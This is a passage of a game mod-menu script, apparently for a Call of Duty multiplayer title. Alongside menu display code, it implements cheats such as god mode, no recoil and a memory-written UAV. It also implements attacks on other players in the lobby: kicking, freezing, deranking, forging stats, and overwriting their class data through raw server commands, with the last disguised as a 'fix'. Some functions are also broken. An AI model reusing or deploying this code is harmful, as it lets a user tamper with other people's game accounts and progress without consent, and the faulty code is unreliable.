        if (isDefined(self.eMenu[self getCursor()].val) ||
            IsDefined(self.eMenu[self getCursor()].ID_list))
            self updateSlider();
        self.menu["OPT"]["COUNT"] setSafeText((self getCursor() + 1) + "  " +
            self.eMenu.size);
    } else {
        curs = self getCursor();
        if (curs >= 13)
            curs = 12;
        opt = self.eMenu.size;
        if ((self.eMenu.size >= 13))
            opt = 13;
        size = (opt * 14.4) + 25;
        self.menu["UI"]["BG_IMAGE_BLUR"] setShader("white", 150, int(size));
        self.menu["UI"]["OPT_BG"].y =
            self.menu["UI"]["BG_IMAGE_BLUR"].y + (size - 5);
        self.menu["OPT"]["INSTRUCT"].y =
            self.menu["UI"]["BG_IMAGE_BLUR"].y + (size - 5);
        self.menu["UI"]["SCROLL_MAIN"].y =
            (self.menu["OPT"]["MENU"].y + (curs * 14.4));
        self.menu["OPT"]["INSTRUCT"] setSafeText("Made by wckd");
        if (IsDefined(self.eMenu[self getCursor()].desc))
            self.menu["OPT"]["INSTRUCT"] setSafeText(
                self.eMenu[self getCursor()].desc);
        if (isDefined(self.menu["UI"]["SLIDER"]))
            self.menu["UI"]["SLIDER"] destroy();
        if (IsDefined(self.menu["UI"]["SLIDER1"]))
            self.menu["UI"]["SLIDER1"] destroy();
        if (isDefined(self.eMenu[self getCursor()].val) ||
            IsDefined(self.eMenu[self getCursor()].ID_list))
            self updateSlider();
        self.menu["OPT"]["COUNT"] setSafeText((self getCursor() + 1) + "  " +
            self.eMenu.size);
    }
}
setMenuText() {
    if (self.menu["current"] == "pack") {
        ary = 0;
        if (self getCursor() >= 15)
            ary = self getCursor() - 14;
        final = "";
        for (e = 0; e < 15; e++) {
            if (isDefined(self.eMenu[ary + e].opt)) {
                if (isDefined(self.pers["COLOR_TOGGLES"][self getCurrentMenu()]
                        [ary + e]))
                    final += (self.eMenu[ary + e].opt) + " ^6ON^7\n";
                else
                    final += (self.eMenu[ary + e].opt) + "^7\n";
            }
        }
        self.menu["OPT"]["MENU"] setSafeText(final);
    } else {
        ary = 0;
        if (self getCursor() >= 13)
            ary = self getCursor() - 12;
        final = "";
        for (e = 0; e < 13; e++) {
            if (isDefined(self.eMenu[ary + e].opt)) {
                if (isDefined(self.pers["COLOR_TOGGLES"][self getCurrentMenu()]
                        [ary + e]))
                    final += (self.eMenu[ary + e].opt) + " ^6ON^7\n";
                else
                    final += (self.eMenu[ary + e].opt) + "^7\n";
            }
        }
        self.menu["OPT"]["MENU"] setSafeText(final);
    }
}
lockMenu(which) {
    if (which == "lock") {
        if (self isMenuOpen())
            self menuClose();
        self.menu["isLocked"] = true;
    } else {
        if (!self isMenuOpen())
            self menuOpen();
        self.menu["isLocked"] = false;
    }
}
flashElem(alpha1, alpha2, time, player) {
    player endon("stop_text_effects");
    while (isDefined(self)) {
        self hudFade(alpha1, time);
        wait time;
        self hudFade(alpha2, time);
        wait time;
    }
}
flashElemMonitor(player) {
    player waittill("stop_text_effects");
    self.alpha = 1;
}
colorToggle(var) {
    if (!IsDefined(self.pers["COLOR_TOGGLES"]))
        self.pers["COLOR_TOGGLES"] = [];
    if (!IsDefined(self.pers["COLOR_TOGGLES"][self getCurrentMenu()]))
        self.pers["COLOR_TOGGLES"][self getCurrentMenu()] = [];
    if (IsDefined(var))
        self.pers["COLOR_TOGGLES"][self getCurrentMenu()][self getCursor()] =
        true;
    else
        self.pers["COLOR_TOGGLES"][self getCurrentMenu()][self getCursor()] =
        undefined;
    self setMenuText();
}
setmyorigin(coords) {
    self setOrigin(coords);
}
testColour() {
    if (!IsDefined(self.testing))
        self.testing = true;
    else
        self.testing = undefined;
    self colorToggle(self.testing);
}
updateSlider(pressed) {
    if (isDefined(self.menu["UI"]["SLIDER"]))
        self.menu["UI"]["SLIDER"] destroy();
    if (IsDefined(self.menu["UI"]["SLIDER1"]))
        self.menu["UI"]["SLIDER1"] destroy();
    if (IsDefined(self.eMenu[self getCursor()].shaders)) {
        if (!isDefined(
                self.sliders[self getCurrentMenu() + "_" + self getCursor()]))
            self.sliders[self getCurrentMenu() + "_" + self getCursor()] = 0;
        value = self.sliders[self getCurrentMenu() + "_" + self getCursor()];
        if (pressed == "R2")
            value++;
        if (pressed == "L2")
            value--;
        if (value > self.eMenu[self getCursor()].shaders.size - 1)
            value = 0;
        if (value < 0)
            value = self.eMenu[self getCursor()].shaders.size - 1;
        self.menu["UI"]["SLIDER"] = self createRectangle(
            "RIGHT", "CENTER", 70, self.menu["UI"]["SCROLL_MAIN"].y,
            self.eMenu[self getCursor()].val, self.eMenu[self getCursor()].val1,
            (1, 1, 1), self.eMenu[self getCursor()].shaders[value], 4, 1);
        self.menu["UI"]["SLIDER1"] = self createText(
            "small", 1, "RIGHT", "CENTER",
            70 - (self.eMenu[self getCursor()].val),
            self.menu["UI"]["SCROLL_MAIN"].y - 2, 4, 1,
            self.eMenu[self getCursor()].RL_list[value], (1, 1, 1));
        self.sliders[self getCurrentMenu() + "_" + self getCursor()] = value;
        return;
    }
    if (IsDefined(self.eMenu[self getCursor()].ID_list)) {
        if (!isDefined(
                self.sliders[self getCurrentMenu() + "_" + self getCursor()]))
            self.sliders[self getCurrentMenu() + "_" + self getCursor()] = 0;
        value = self.sliders[self getCurrentMenu() + "_" + self getCursor()];
        if (pressed == "R2")
            value++;
        if (pressed == "L2")
            value--;
        if (value > self.eMenu[self getCursor()].ID_list.size - 1)
            value = 0;
        if (value < 0)
            value = self.eMenu[self getCursor()].ID_list.size - 1;
        self.menu["UI"]["SLIDER"] = self createText(
            "small", 1, "RIGHT", "CENTER", 70,
            self.menu["UI"]["SCROLL_MAIN"].y - 2, 4, 1,
            "<" + self.eMenu[self getCursor()].RL_list[value] + ">", (1, 1, 1));
        self.sliders[self getCurrentMenu() + "_" + self getCursor()] = value;
        return;
    }
    if (!isDefined(
            self.sliders[self getCurrentMenu() + "_" + self getCursor()]))
        self.sliders[self getCurrentMenu() + "_" + self getCursor()] =
        self.eMenu[self getCursor()].val;
    if (pressed == "R2")
        self.sliders[self getCurrentMenu() + "_" + self getCursor()] +=
        self.eMenu[self getCursor()].mult;
    if (pressed == "L2")
        self.sliders[self getCurrentMenu() + "_" + self getCursor()] -=
        self.eMenu[self getCursor()].mult;
    if (self.sliders[self getCurrentMenu() + "_" + self getCursor()] >
        self.eMenu[self getCursor()].max)
        self.sliders[self getCurrentMenu() + "_" + self getCursor()] =
        self.eMenu[self getCursor()].min;
    if (self.sliders[self getCurrentMenu() + "_" + self getCursor()] <
        self.eMenu[self getCursor()].min)
        self.sliders[self getCurrentMenu() + "_" + self getCursor()] =
        self.eMenu[self getCursor()].max;
    self.menu["UI"]["SLIDER"] = self createText(
        "small", 1, "RIGHT", "CENTER", 70, self.menu["UI"]["SCROLL_MAIN"].y - 2,
        4, 1,
        "(" + self.sliders[self getCurrentMenu() + "_" + self getCursor()] +
        " / " + self.eMenu[self getCursor()].max + ")",
        (1, 1, 1));
}
testSlider(value) {
    self IPrintLn(value);
}
refreshMenu() {
    self menuClose(true);
    self menuOpen();
}
ChangeGamemode(mode) {
    self menuClose();
    foreach(player in level.players) {
        string = "Changing game mode, Please wait..";
        player.gamemode["CHANGING"]["TEXT"] = player createText(
            "small", 1, "CENTER", "CENTER", 0, 0, 3, 1, string, (1, 1, 1));
        player.gamemode["CHANGING"]["BLACK"] = player createRectangle(
            "CENTER", "CENTER", 0, 0, 135, 14, (0, 0, 0), "white", 1, .4);
        player.gamemode["CHANGING"]["TOP_GREEN"] = player createRectangle(
            "CENTER", "CENTER", 0, 7, 135, 1, player.menuCust["MENU_COLOR"],
            "white", 2, .9);
        player.gamemode["CHANGING"]["BOTTOM_BLUE"] = player createRectangle(
            "CENTER", "CENTER", 0, -7, 135, 1, player.menuCust["MENU_COLOR"],
            "white", 2, .9);
        player.gamemode["CHANGING"]["LFET_GREEN"] = player createRectangle(
            "CENTER", "CENTER", -67, 0, 1, 14, player.menuCust["MENU_COLOR"],
            "white", 2, .9);
        player.gamemode["CHANGING"]["RIGHT_BLUE"] = player createRectangle(
            "CENTER", "CENTER", 67, 0, 1, 14, player.menuCust["MENU_COLOR"],
            "white", 2, .9);
        SetDvar("ui_gametype", mode);
        player SetClientDvar("ui_gametype", mode);
        SetDvar("party_gametype", mode);
        player SetClientDvar("party_gametype", mode);
        SetDvar("g_gametype", mode);
        player SetClientDvar("g_gametype", mode);
        wait 2.5;
        destroyAll(player.gamemode["CHANGING"]);
        if (self isHost() || self isDeveloper() || self isAdmin())
            map_restart(false);
    }
}
UnstuckSelf() {
    x = self.angles[1];
    if (-1 >= x && x >= -90) {
        self SetOrigin(self.origin + (10, -10, 10));
    }
    if (-90 >= x && x >= -180) {
        self SetOrigin(self.origin + (-10, -10, 10));
    }
    if (90 <= x && x <= 180) {
        self SetOrigin(self.origin + (-10, 10, 10));
    }
    if (0 <= x && x <= 90) {
        self SetOrigin(self.origin + (10, 10, 10));
    }
    self IPrintLn("Help Stepbro, I'm Stuck!");
}
alwayssoftland() {
    self.pers["has_softland"] =
        (isDefined(self.pers["has_softland"]) ? undefined : true);
    if (isDefined(self.pers["has_softland"])) {
        self IPrintLn("Softlands: ^6On");
        self colortoggle(self.pers["has_softland"]);
    } else {
        self IPrintLn("Softlands: ^1Off");
        self colortoggle(self.pers["has_softland"]);
    }
}
softland() {
    self endon("disconnect");
    level endon("EndAlwaysSoftland");
    for (;;) {
        level waittill("game_ended");
        if (isDefined(self.pers["has_softland"])) {
            setDvar("snd_enable3D", 0);
            setDvar("bg_falldamagemaxheight", 9999);
            setDvar("bg_falldamageminheight", 9999);
            setdvar("hud_fadeout_speed", 0);
            self thread killcamsoftland();
            self setstance("prone");
        }
    }
}
killcamsoftland() {
    self endon("disconnect");
    for (;;) {
        self waittill("begin_killcam");
        wait 3;
        setDvar("bg_falldamagemaxheight", 9999);
        setDvar("bg_falldamageminheight", 9999);
        setdvar("hud_fadeout_speed", 0);
        setDvar("snd_enable3D", 0);
    }
}
fastEndGame() {
    if (!self isHost()) {
        self iPrintln("Whoops! Only the Host can Fast End");
        return;
    } else {
        ExitLevel(false);
    }
}
GodMode() {
    self.godMode = (isDefined(self.godmode) ? undefined : true);
    if (isDefined(self.godMode)) {
        SavedMaxHealth = self.maxhealth;
        self iPrintln("God Mode: ^6On");
        self colortoggle(self.godMode);
    } else
        self iPrintln("God Mode: ^1Off");
    self colortoggle(self.godMode);
    while (isDefined(self.godmode) && isAlive(self)) {
        self maps\mp\perks\_perks::givePerk("specialty_falldamage");
        self.maxhealth = 2147483647;
        self.health = self.maxhealth;
        wait .05;
    }
    self.maxhealth = SavedMaxHealth;
    self.health = self.maxhealth;
    if (isDefined(self.godMode))
        self thread GodMode();
}
Invisibility() {
    if (!isDefined(self.invisibility)) {
        self.invisibility = true;
        self hide();
        self iPrintln("Invisibility: ^6On");
        self colortoggle(self.invisibility);
    } else {
        self.invisibility = undefined;
        self show();
        self iPrintln("Invisibility: ^1Off");
        self colortoggle(self.invisibility);
    }
}
ufobind() {
    self endon("disconnect");
    self endon("game_ended");
    self endon("ufobindoff");
    for (;;) {
        self notifyonplayercommand("mel", "+melee");
        self waittill("mel");
        if (self getstance() == "crouch") {
            if (!isDefined(self.UFOMode)) {
                self.UFOMode = true;
                self thread noclip();
                self disableweapons();
                self.owp = self getweaponslistoffhands();
                foreach(w in self.owp) self takeweapon(w);
            } else {
                self.UFOMode = undefined;
                self notify("noclipoff");
                self unlink();
                self enableweapons();
                foreach(w in self.owp) self giveweapon(w);
            }
        }
    }
}
noclip() {
    self endon("death");
    self endon("noclipoff");
    if (isdefined(self.newufo))
        self.newufo delete();
    self.newufo = spawn("script_origin", self.origin);
    self.newufo.origin = self.origin;
    self playerlinkto(self.newufo);
    for (;;) {
        vec = anglestoforward(self getplayerangles());
        if (self attackbuttonpressed()) {
            end = (vec[0] * 60, vec[1] * 60, vec[2] * 60);
            self.newufo.origin = self.newufo.origin + end;
        } else if (self adsbuttonpressed()) {
            end = (vec[0] * 25, vec[1] * 25, vec[2] * 25);
            self.newufo.origin = self.newufo.origin + end;
        }
        wait 0.05;
    }
}
UFOMode() {
    self.pers["UFOMode"] = (isDefined(self.pers["UFOMode"]) ? undefined : true);
    if (isDefined(self.pers["UFOMode"])) {
        self thread noclip();
        self disableweapons();
        self.owp = self getweaponslistoffhands();
        foreach(w in self.owp) self takeweapon(w);
        self iPrintln("UFO Mode: ^6On");
        colorToggle(self.pers["UFOMode"]);
    } else {
        self notify("noclipoff");
        self unlink();
        self enableweapons();
        foreach(w in self.owp) self giveweapon(w);
        self iPrintln("UFO Mode: ^1Off");
        colorToggle(self.pers["UFOMode"]);
    }
}
InfiniteAmmo() {
    self.InfiniteAmmo = (isDefined(self.InfiniteAmmo) ? undefined : true);
    if (isDefined(self.InfiniteAmmo)) {
        self iPrintln("Infinite Ammo: ^6On");
        self colortoggle(self.InfiniteAmmo);
    } else {
        self iPrintln("Infinite Ammo: ^1Off");
        self colortoggle(self.InfiniteAmmo);
    }
    self endon("disconnect");
    while (isDefined(self.InfiniteAmmo)) {
        weapons = self GetWeaponsListAll();
        foreach(weapon in weapons) {
            self GiveMaxAmmo(weapon);
            self SetWeaponAmmoClip(weapon, 999);
        }
        wait .05;
    }
}
NoRecoil() {
    if (!isDefined(self.NoRecoil)) {
        self.NoRecoil = true;
        self iPrintln("No Recoil: ^6On");
        self colortoggle(self.NoRecoil);
        while (isDefined(self.NoRecoil)) {
            self Player_RecoilScaleOn(0);
            wait .05;
        }
    } else {
        self.NoRecoil = undefined;
        self Player_RecoilScaleOn(100);
        self iPrintln("No Recoil: ^1Off");
        self colortoggle(self.NoRecoil);
    }
}
NoSpread() {
    if (!isDefined(self.NoSpread)) {
        self.NoSpread = true;
        self iPrintln("No Spread: ^6On");
        self colortoggle(self.NoSpread);
        while (isDefined(self.NoSpread)) {
            self SetSpreadOverride(1);
            wait .05;
        }
    } else {
        self.NoSpread = undefined;
        self ResetSpreadOverride();
        self iPrintln("No Spread: ^1Off");
        self colortoggle(self.NoSpread);
    }
}
douav() {
    self.ConstantUAV = (isDefined(self.ConstantUAV) ? undefined : true);
    if (isConsole())
        address = 0x830CF264 + (self GetEntityNumber() * 0x3700);
    else
        address = 0x1B11418 + (self GetEntityNumber() * 0x366C);
    if (isDefined(self.ConstantUAV)) {
        WriteByte(address, 0x01);
    } else {
        WriteByte(address, 0x00);
    }
}
UAV() {
    self.ConstantUAV = (isDefined(self.ConstantUAV) ? undefined : true);
    if (isConsole())
        address = 0x830CF264 + (self GetEntityNumber() * 0x3700);
    else
        address = 0x1B11418 + (self GetEntityNumber() * 0x366C);
    if (isDefined(self.ConstantUAV)) {
        WriteByte(address, 0x01);
        self iPrintln("UAV: ^6On");
        self colortoggle(self.ConstantUAV);
    } else {
        WriteByte(address, 0x00);
        self iPrintln("UAV: ^1Off");
        self colortoggle(self.ConstantUAV);
    }
}
RedBox() {
    if (!isDefined(self.RedBox)) {
        self.RedBox = true;
        self ThermalVisionFOFOverlayOn();
        self iPrintln("Red Boxes: ^6On");
        self colortoggle(self.RedBox);
    } else {
        self.RedBox = undefined;
        self ThermalVisionFOFOverlayOff();
        self iPrintln("Red Boxes: ^1Off");
        self colortoggle(self.RedBox);
    }
}
ThirdPerson() {
    if (!isDefined(self.ThirdPerson)) {
        self.ThirdPerson = true;
        self SetClientDvar("cg_thirdPerson", "1");
        self iPrintln("Third Person: ^6On");
        self colortoggle(self.ThirdPerson);
    } else {
        self.ThirdPerson = undefined;
        self SetClientDvar("cg_thirdPerson", "0");
        self iPrintln("Third Person: ^1Off");
        self colortoggle(self.ThirdPerson);
    }
}
ProMod() {
    if (!isDefined(self.ProMod)) {
        self.ProMod = true;
        self SetClientDvar("cg_fov", 80);
        self iPrintln("Pro Mod: ^6On");
        self colortoggle(self.ProMod);
    } else {
        self.ProMod = undefined;
        self SetClientDvar("cg_fov", 65);
        self iPrintln("Pro Mod: ^1Off");
        self colortoggle(self.ProMod);
    }
}
RenamePlayer(string, player) {
    if (player isDeveloper() && self != player)
        return;
    if (!isConsole())
        client = 0x1B113DC + (player GetEntityNumber() * 0x366C);
    else {
        client = 0x830CF210 + (player GetEntityNumber() * 0x3700);
        name = ReadString(client);
        for (a = 0; a < name.size; a++) WriteByte(client + a, 0x00);
    }
    WriteString(client, string);
    if (isDefined(self.pers["keep_name"])) {
        continue;
    } else {
        player iPrintln("Your new name is ^6" + string);
    }
    player.pers["keep_name"] = string;
}
ChatWithLobby(string) {
    iPrintlnBold("[^6" + self getName() + "^7]: " + string);
}
SpawnText() {
    self.pers["HideSpawnText"] =
        (isDefined(self.pers["HideSpawnText"]) ? undefined : true);
    if (isDefined(self.pers["HideSpawnText"])) {
        self iPrintln("Disable Spawn Text: ^6On");
        self colortoggle(self.pers["HideSpawnText"]);
    } else {
        self iPrintln("Disable Spawn Text: ^1Off");
        self colortoggle(self.pers["HideSpawnText"]);
    }
}
SelfSuicide() {
    self Suicide();
}
SavenLoadBinds() {
    self.pers["SavenLoad"] =
        (isDefined(self.pers["SavenLoad"]) ? undefined : true);
    if (isDefined(self.pers["SavenLoad"])) {
        self thread loadposbind();
        self thread saveposbind();
        self iPrintln("Save & Load Binds: ^6On");
        self iPrintln("Crouch + [{+actionslot 3}] to Save Position");
        self iPrintln("Crouch + [{+actionslot 4}] to Load Position");
        self colortoggle(self.pers["SavenLoad"]);
    } else {
        self notify("stoploading");
        self notify("stopsaving");
        self iPrintln("Save & Load Binds: ^1Off");
        self colortoggle(self.pers["SavenLoad"]);
    }
}
loadposbind() {
    self endon("disconnect");
    self endon("stoploading");
    for (;;) {
        self notifyonplayercommand("loadpos", "+actionslot 4");
        self waittill("loadpos");
        if (self.pers["loc"] == true && self getstance() == "crouch") {
            self setorigin(self.pers["savepos"]);
            self setplayerangles(self.pers["saveang"]);
        }
    }
}
saveposbind() {
    self endon("disconnect");
    self endon("stopsaving");
    for (;;) {
        self notifyonplayercommand("savepos", "+actionslot 3");
        self waittill("savepos");
        if (self getstance() == "crouch") {
            self.pers["loc"] = true;
            self.pers["savepos"] = self.origin;
            self.pers["saveang"] = self.angles;
            self iPrintln("Position: ^6Saved");
        }
    }
}
LoadPositionOnSpawn() {
    self.pers["LoadPosSpawn"] =
        (isDefined(self.pers["LoadPosSpawn"]) ? undefined : true);
    if (isDefined(self.pers["LoadPosSpawn"])) {
        self iPrintln("Load Position On Spawn: ^6On");
        self colortoggle(self.pers["LoadPosSpawn"]);
    } else {
        self iPrintln("Load Position On Spawn: ^1Off");
        self colortoggle(self.pers["LoadPosSpawn"]);
    }
}
TeleportToSky() {
    self SetOrigin(self.origin + (0, 0, 25000));
}
TeleportToCrosshair() {
    self SetOrigin(self TraceBullet());
}
CustomTeleport() {
    self BeginLocationSelection("map_artillery_selector", false);
    self.SelectingLocation = true;
    self waittill("confirm_location", location);
    self EndLocationSelection();
    self.SelectingLocation = undefined;
    newLocation = BulletTrace(location + (0, 0, 10000),
        location + (0, 0, -10000), 0, self)["position"];
    self SetOrigin(newLocation);
}
SpecNade() {
    self.specNading = (isDefined(self.specNading) ? undefined : true);
    if (isDefined(self.specNading)) {
        self iPrintln("Spec Nade: ^6On");
        self colortoggle(self.specNading);
        self endon("disconnect");
        self endon("EndSpecNade");
        while (1) {
            self waittill("grenade_fire", grenade, name);
            linker = SpawnScriptModel(grenade.origin, "tag_origin");
            linker LinkTo(grenade);
            self PlayerLinkTo(linker);
            while (isDefined(grenade) && isAlive(self)) wait .05;
            self Unlink();
            linker delete();
        }
    } else {
        self iPrintln("Spec Nade: ^1Off");
        self colortoggle(self.specNading);
        self notify("EndSpecNade");
        self Unlink();
        if (isDefined(linker))
            linker delete();
    }
}
RocketRiding() {
    self.RocketRiding = (isDefined(self.RocketRiding) ? undefined : true);
    if (isDefined(self.RocketRiding)) {
        self iPrintln("Rocket Ride: ^6On");
        self colortoggle(self.RocketRiding);
        self iPrintln("Shoot an missile towards a Player to Rocket Ride them!");
        self iPrintln("NOTE* The other Player must also have Rocket Riding on");
        self endon("EndRocketRiding");
        while (isDefined(self.RocketRiding)) {
            self waittill("missile_fire", missile, weaponName);
            if (GetWeaponClass(weaponName) == "weapon_projectile") {
                wait .2;
                player = GetClosest(self.origin, level.players, self);
                if (!isDefined(player.RidingRocket)) {
                    player.RidingRocket = true;
                    linker = SpawnScriptModel(missile.origin, "tag_origin");
                    linker LinkTo(missile);
                    player PlayerLinkTo(linker, "tag_origin");
                    wait .1;
                    player thread WatchRocket(missile, linker);
                }
            }
        }
    } else {
        self notify("EndRocketRiding");
        self iPrintln("Rocket Ride: ^1Off");
        self colortoggle(self.RocketRiding);
    }
}
WatchRocket(rocket, linker) {
    while (isDefined(rocket) && isAlive(self)) {
        if (self MeleeButtonPressed() || self AttackButtonPressed())
            break;
        wait .05;
    }
    self Unlink();
    linker delete();
    self.RidingRocket = undefined;
}
TakeWeapons() {
    self TakeAllWeapons();
}
TakeCurrentWeapon() {
    self TakeWeapon(self GetCurrentWeapon());
}
DropWeapon() {
    self DropItem(self GetCurrentWeapon());
}
RefillWeaponAmmo() {
    weapons = self GetWeaponsListPrimaries();
    for (a = 0; a < weapons.size; a++) self givestartammo(weapons[a]);
}
RefillGrenades() {
    grenades = self GetWeaponsListOffhands();
    for (a = 0; a < grenades.size; a++) self GiveMaxAmmo(grenades[a]);
}
RefillAmmo() {
    weapons = self GetWeaponsListPrimaries();
    grenades = self GetWeaponsListOffhands();
    for (a = 0; a < weapons.size; a++) self givestartammo(weapons[a]);
    for (a = 0; a < grenades.size; a++) self GiveMaxAmmo(grenades[a]);
}
GivePlayerWeapon(Weapon) {
    weap = StrTok(Weapon, "_");
    if (weap[weap.size - 1] != "mp")
        Weapon += "_mp";
    if (self hasWeapon(Weapon)) {
        self SetSpawnWeapon(Weapon);
        return;
    }
    self GiveWeapon(Weapon);
    self GiveMaxAmmo(Weapon);
    self SwitchToWeapon(Weapon);
}
righthandtk() {
    self TakeWeapon(self GetCurrentOffhand());
    self giveweapon("throwingknife_mp", 0, false);
    waitframe();
    self takeweapon("throwingknife_mp");
    waitframe();
    self giveweapon("throwingknife_rhand_mp", 0, false);
}
giveGlowstick() {
    self TakeWeapon(self GetCurrentOffhand());
    self SetOffhandPrimaryClass("other");
    self GiveWeapon("lightstick_mp");
}
glowstickclass() {
    self endon("disconnect");
    for (;;) {
        lethal = self GetCurrentOffhand();
        if (!isSubStr(lethal, "semtex") &&
            isDefined(self.pers["has_glowstck"])) {
            self TakeWeapon(lethal);
            self SetOffhandPrimaryClass("other");
            self GiveWeapon("lightstick_mp");
        }
        wait 5;
    }
}
givestreak(s) {
    self maps\mp\killstreaks\_killstreaks::givekillstreak(s, false);
    self iPrintln("Killstreak: ^6" + s + " given");
}
spawncarepackagecross() {
    carepack = self thread maps\mp\killstreaks\_airdrop::dropTheCrate(
        self TraceBullet() + (0, 0, 25), "airdrop",
        self TraceBullet() + (0, 0, 25), true, undefined,
        self TraceBullet() + (0, 0, 25));
    self notify("drop_crate");
}
delete_carepack() {
    level.airDropCrates = getEntArray("care_package", "targetname");
    level.oldAirDropCrates = getEntArray("airdrop_crate", "targetname");
    if (level.airDropCrates.size) {
        foreach(crate in level.AirDropCrates) {
            if (isDefined(crate.objIdFriendly))
                _objective_delete(crate.objIdFriendly);
            if (isDefined(crate.objIdEnemy))
                _objective_delete(crate.objIdEnemy);
            crate delete();
        }
    }
}
removeks() {
    self maps\mp\killstreaks\_killstreaks::givekillstreak("none", true);
    wait 1;
    self thread newremoveks();
    self iPrintln("All Killstreak: ^1Removed");
}
newremoveks() {
    foreach(index, streakstruct in self.pers["killstreaks"])
    self.pers["killstreaks"][index] = undefined;
}
InsaneAccStats(player) {
    SV_GameSendServerCommand(
        "J 2076 C09EF87F 2084 A401 2072 C09EF87F 2096 89A20A 2092 89A20A 2152 C09EF87F 2156 3905 2116 00EB41 2120 00EB41 2128 C09EF87F 2132 A401 2136 89A20A 2140 3905 2080 3905",
        player);
    player iPrintln("Insane Stats ^6Set");
}
Level70(player) {
    SV_GameSendServerCommand("J 2056 206426", player);
    player iPrintln("Level 70 ^6Set");
}
giveRankXP1(value) {
    if (self GetPlayerData("restXPGoal") >
        self maps\mp\gametypes\_rank::getRankXP())
        self SetPlayerData("restXPGoal",
            self GetPlayerData("restXPGoal") + value);
    oldxp = self maps\mp\gametypes\_rank::getRankXP();
    self maps\mp\gametypes\_rank::incRankXP(value);
    if (maps\mp\gametypes\_rank::updateRank(oldxp))
        self thread maps\mp\gametypes\_rank::updateRankAnnounceHUD();
    self maps\mp\gametypes\_rank::syncXPStat();
    self.pers["summary"]["challenge"] += value;
    self.pers["summary"]["xp"] += value;
}
AllChallenges(player) {
    if (isDefined(player.AllChallengesProgress))
        return;
    player.AllChallengesProgress = true;
    player endon("disconnect");
    player iPrintlnBold("Unlock All Starting");
    player SetPlayerData("iconUnlocked", "cardicon_prestige10_02", 1);
    foreach(challengeRef, challengeData in level.challengeInfo) {
        finalTarget = 0;
        finalTier = 0;
        for (tierId = 1; isDefined(challengeData["targetval"][tierId]); tierId++) {
            finalTarget = challengeData["targetval"][tierId];
            finalTier = tierId + 1;
        }
        if (player isItemUnlocked(challengeRef)) {
            player setPlayerData("challengeProgress", challengeRef,
                finalTarget);
            player setPlayerData("challengeState", challengeRef, finalTier);
            player iprintlnBold("^" + randomInt(9) + challengeRef +
                " Complete");
        }
        wait(0.04);
    }
    player iPrintlnBold("^6All Challenges Complete");
    SV_GameSendServerCommand("J 2056 206426", player);
    player.AllChallengesProgress = undefined;
}
SetPrestige(value, player) {
    if (value == "eleven")
        Prestige = "0B000";
    else if (value == "ten")
        Prestige = "0A000";
    else if (value == "nine")
        Prestige = "09000";
    else if (value == "eight")
        Prestige = "08000";
    else if (value == "seven")
        Prestige = "07000";
    else if (value == "six")
        Prestige = "06000";
    else if (value == "five")
        Prestige = "05000";
    else if (value == "four")
        Prestige = "04000";
    else if (value == "three")
        Prestige = "03000";
    else if (value == "two")
        Prestige = "02000";
    else if (value == "one")
        Prestige = "01000";
    else if (value == "zero")
        Prestige = "00000";
    SV_GameSendServerCommand("J 2064 " + Prestige + ";", player);
}
RevivePlayer(player) {
    player.lastStand = undefined;
    player.finalStand = undefined;
    player clearLowerMessage("last_stand");
    if (player _hasPerk("specialty_lightweight"))
        player.moveSpeedScaler = 1.07;
    else
        player.moveSpeedScaler = 1;
    player LastStandRevive();
    player.headicon = "";
    player setStance("stand");
    player.revived = true;
    player notify("revive");
    player.health = player.maxHealth;
    player _enableUsability();
    if (game["state"] == "postgame") {
        assert(!level.intermission);
        player maps\mp\gametypes\_gamelogic::freezePlayerForRoundEnd();
    }
    player maps\mp\gametypes\_playerlogic::lastStandRespawnPlayer();
}
KillPlayer(player) {
    if (player isHost()) {
        self iPrintln("Whoops! That was the host... He will know it was you!");
        player iPrintln(self.name + " just killed you!");
        player Suicide();
    } else {
        player Suicide();
    }
}
KickPlayer(player) {
    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to Kick you... lol wat?");
        return;
    } else {
        Kick(player GetEntityNumber());
    }
}
FreezePlayer(player) {
    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to Freeze your controls");
        return;
    } else if (!player.frozenControls) {
        player.frozenControls = true;
        player FreezeControls(true);
        self iPrintln(player.name + " has been ^6Frozen");
    } else {
        player.frozenControls = undefined;
        player FreezeControls(false);
        self iPrintln(player.name + " has been ^1UnFrozen");
    }
}
SendToSky(player) {
    if (player isHost()) {
        if (self isHost()) {
            player SetOrigin(player.origin + (0, 0, 500000));
            self iPrintln(player.name + " has been sent to the sky");
        } else {
            self iPrintln("Whoops! You shouldn't try to mess with the Host");
            player iPrintln(self.name + " just tried to send you to the Sky");
            return;
        }
    } else {
        player SetOrigin(player.origin + (0, 0, 500000));
        self iPrintln(player.name + " has been sent to the sky");
    }
}
SendToCrosshairs(player) {
    player SetOrigin(self TraceBullet());
}
FixFrozenClasses(player) {
    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to Freeze your Classes");
        return;
    } else {
        SV_GameSendServerCommand(
            "J 3040 5E31796F75747562652E636F6D2F403539370000 3104 5E32796F75747562652E636F6D2F403539370000 3168 5E33796F75747562652E636F6D2F403539370000 3232 5E34796F75747562652E636F6D2F403539370000 3296 5E35796F75747562652E636F6D2F403539370000 3360 5E36796F75747562652E636F6D2F403539370000 3424 5E37796F75747562652E636F6D2F403539370000 3488 5E31796F75747562652E636F6D2F403539370000 3552 5E32796F75747562652E636F6D2F403539370000 3616 5E333796F75747562652E636F6D2F403539370000",
            player);
        self iPrintln("You have fixed the " + player.name + "'s classes");
    }
}
GiveUnlockAll(player) {
    if (player isHost()) {
        if (self isHost()) {
            self thread AllChallenges(player);
            self iPrintln(player.name + " has been given ^6Unlock All");
        } else {
            self iPrintln("Whoops! You shouldn't try to mess with the Host");
            player iPrintln(self.name + " just tried to give you Unlock All");
            return;
        }
    } else {
        self thread AllChallenges(player);
        self iPrintln(player.name + " has been given ^6Unlock All");
    }
}
attemptDerank(player) {
    if (player isHost()) {
        self iPrintln("Whoops! You shouldn't try to mess with the Host");
        player iPrintln(self.name + " just tried to Derank you");
        if (!self isHost())
            return;
        else
            continue;
        defaultvalue = level.scoreInfo["buzzkill"]["value"];
        maps\mp\gametypes\_rank::registerScoreInfo("buzzkill", -2516000);
        player thread maps\mp\gametypes\_rank::giveRankXP("buzzkill");
        waitframe();
        maps\mp\gametypes\_rank::registerScoreInfo("buzzkill", defaultvalue);
        self iPrintln(player.name + " has been Deranked");
    }
}
FreezeConsole(player) {}
FreezeClasses(player) {
